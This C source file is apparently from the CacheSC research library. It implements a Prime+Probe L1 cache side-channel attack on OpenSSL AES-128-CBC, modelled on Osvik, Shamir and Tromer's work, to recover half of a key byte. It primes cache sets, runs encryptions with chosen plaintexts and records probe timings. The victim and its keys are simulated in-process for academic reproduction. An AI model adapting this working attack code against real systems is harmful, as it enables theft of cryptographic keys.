/*
 * This file is part of the CacheSC library (https://github.com/Miro-H/CacheSC),
 * which implements Prime+Probe attacks on virtually and physically indexed
 * caches.
 *
 * Copyright (C) 2020  Miro Haller
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * Contact: miro.haller@alumni.ethz.ch
 *
 * Short description of this file:
 * This file uses CacheSC to implement the classic chosen-plaintext attack,
 * similar to the one-round attack from Osvik, Shamir, and Tromer (presented in
 * Cache Attacks and Countermeasures: the Case of AES), to recover half of any
 * key byte of the AES-CBC encryption. However, instead of Evict+Time we use
 * Prime+Probe for this attack.
 *
 * To reproduce our results, make sure the CPU governor is set to performance
 * (cpufreq -c CPU_NUMBER -g performance). The project report, linked in this
 * repository, provides more details on our test cases.
 */

#include <assert.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#include <cachesc.h>

/*
 * Configure side-channel attack
 */

// Target plaintext/key byte in cache side channel attack
#define TARGET_BYTE 0
#define CPU_NUMBER 1
#define MSRMTS_PER_SAMPLE L1_SETS

// AES-CBC parameters, for simplicity, only encrypt one block.
#define IV_LEN 16
#define KEY_LEN 16

// PT_LEN must be a multiple of 16.
#define PT_LEN 16
#define BLOCK_PAD(l) 16 * (((l) + 15)/16)

// local functions
void usage(const char *prog);
__attribute__((always_inline)) static inline void handleErrors(void);

int main(int argc, char **argv) {
    int sample_cnt = -1;
    uint32_t i;

    if (argc == 2)
        sample_cnt = atoi(argv[1]);
    if (sample_cnt < 0)
        usage(argv[0]);


    /*
     * Initial preparation
     */
    PRINT_LINE("Initial preparation\n");
    PRINT_LINE("Number of samples: %d\n", sample_cnt);
    PRINT_LINE("Measurements per sample: %d\n", MSRMTS_PER_SAMPLE);

    set_seed();

    // Initialize mesurement data structures
    cache_ctx *cache_ctx  = get_cache_ctx(L1);
    cacheline *l1         = prepare_cache_ds(cache_ctx);
    pin_to_cpu(CPU_NUMBER);

    size_t res_size  = sample_cnt * MSRMTS_PER_SAMPLE * sizeof(time_type);
    time_type *res   = (time_type *) malloc(res_size);
    assert(res);
    memset(res, 0, res_size);

    // Initialize AES-CBC
    EVP_CIPHER_CTX aes_ctx;
    EVP_CIPHER_CTX_init(&aes_ctx);
    int ctx_cache_set = get_cache_set(cache_ctx, &aes_ctx);
    int ct_len;

    // Initialize arrays for plaintexts, ciphertexts, and keys and place them
    // in memory to avoid collisions as much as possible.

    // Place ctx, ct, pt, and key in different cache sets (if possible).
    // `sets * CACHELINE_SIZE` is the size that covers all cache sets
    // which is added to be able to choose any cache set offset we want.
    uint16_t pt_spanned_cls = get_spanned_cache_lines(cache_ctx, PT_LEN);
    uint64_t data_len       = (2 * pt_spanned_cls
                               + get_spanned_cache_lines(cache_ctx, KEY_LEN)
                               + cache_ctx->sets) * CACHELINE_SIZE;

    unsigned char *data = (unsigned char *) aligned_alloc(PAGE_SIZE, data_len);
    assert(data);

    // Place ct in the cache set after ctx
    unsigned char *ct   = data + CACHELINE_SIZE * ((ctx_cache_set
                          + get_spanned_cache_lines(cache_ctx, sizeof(EVP_CIPHER_CTX)))
                          % cache_ctx->sets);
    unsigned char *pt   = ct + pt_spanned_cls * CACHELINE_SIZE;
    unsigned char *key  = pt + pt_spanned_cls * CACHELINE_SIZE;

    unsigned char *pt_arr = (unsigned char *) malloc(PT_LEN * sample_cnt);
    assert(pt_arr);
    for (i = 0; i < sample_cnt; ++i)
        gen_rand_bytes(pt_arr + i * PT_LEN, PT_LEN);

    // Initialize values for victim
    unsigned char *key_arr = (unsigned char *) malloc(KEY_LEN * sample_cnt);
    for (i = 0; i < sample_cnt; ++i)
        gen_rand_bytes(key_arr + i * KEY_LEN, KEY_LEN);

    // A 128 bit IV, fixed for this example (initialized to 0), as the plaintext
    // is already randomized
    unsigned char iv[IV_LEN];
    memset(iv, 0, IV_LEN);

    // Predicting the accessed set depends on the Te0 offset.
    // This could be detected by monitoring the cache usage. Alternatively, one
    // could also patch the openssl library to export this address, e.g. with
    // the function call EVP_aes_get_Te0_addr() and then find the set like this:
    // get_cache_set(cache_ctx, (void *) (EVP_aes_get_Te0_addr()
    // + key_arr[TARGET_BYTE] * 4))
    PRINT_LINE("Legend: key byte: 0x%02x\n", key_arr[TARGET_BYTE]);

    uint32_t *curr_res      = res;
    cacheline *curr_head    = l1;
    cacheline *next_head;


    /*
     * Make baseline measurements for normalisation, using encryptions with
     * random keys (optional)
     */
    #ifdef NORMALIZE
    prepare_measurement();

    for (i = 0; i < sample_cnt; ++i) {
        memcpy(pt, pt_arr + i * PT_LEN, PT_LEN);
        memcpy(key, key_arr + i * KEY_LEN, KEY_LEN);

        if(1 != EVP_EncryptInit_ex(&aes_ctx, EVP_aes_128_cbc(), NULL, key, iv))
            handleErrors();

        curr_head = prime(curr_head);
        if(1 != EVP_EncryptUpdate(&aes_ctx, ct, &ct_len, pt, PT_LEN))
            handleErrors();
        next_head = probe(L1, curr_head);
        get_msrmts_for_all_set(curr_head, curr_res);

        // prepare for next iteration
        curr_head = next_head;
        curr_res += MSRMTS_PER_SAMPLE;
    }

    PRINT_LINE("Output cache set access baseline data\n");
    print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);

    // reset changes
    memset(res, 0, res_size);
    curr_res    = res;
    curr_head   = l1;
    #endif


    /*
     * Start attacking for "sample_cnt" rounds
     */
    print_banner("Start L1 cache attack(s)");

    prepare_measurement();

    for (i = 0; i < sample_cnt; ++i) {
        memcpy(pt, pt_arr + i * PT_LEN, PT_LEN);
        memcpy(key, key_arr + i * KEY_LEN, KEY_LEN);
        memcpy(key, key_arr, KEY_LEN);
        pt[TARGET_BYTE] = 0;

        if(1 != EVP_EncryptInit_ex(&aes_ctx, EVP_aes_128_cbc(), NULL, key, iv))
            handleErrors();

        /* Prime */
        curr_head = prime(curr_head);

        /* Encrypt */
        if(1 != EVP_EncryptUpdate(&aes_ctx, ct, &ct_len, pt, PT_LEN))
            handleErrors();

        // No EVP_EncryptFinal_ex, because our plaintext is a multiple of the
        // block size

        /* Probe */
        next_head = probe(L1, curr_head);

        get_msrmts_for_all_set(curr_head, curr_res);

        // prepare for next iteration
        curr_head = next_head;
        curr_res += MSRMTS_PER_SAMPLE;
    }

    print_banner("Stop L1 cache attack(s)");


    /*
     * Print output
     */
    PRINT_LINE("Output cache attack data\n");
    print_results(res, sample_cnt, MSRMTS_PER_SAMPLE);


    /*
     * Cleanup
     */
    free(data);
    free(pt_arr);
    free(key_arr);
    free(res);
    release_cache_ds(cache_ctx, l1);
    release_cache_ctx(cache_ctx);
    EVP_CIPHER_CTX_cleanup(&aes_ctx);

    return EXIT_SUCCESS;
}

void usage(const char *prog) {
    fprintf(stderr, "Usage: %s <samples>\n", prog);
    exit(EXIT_FAILURE);
}

static inline void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}
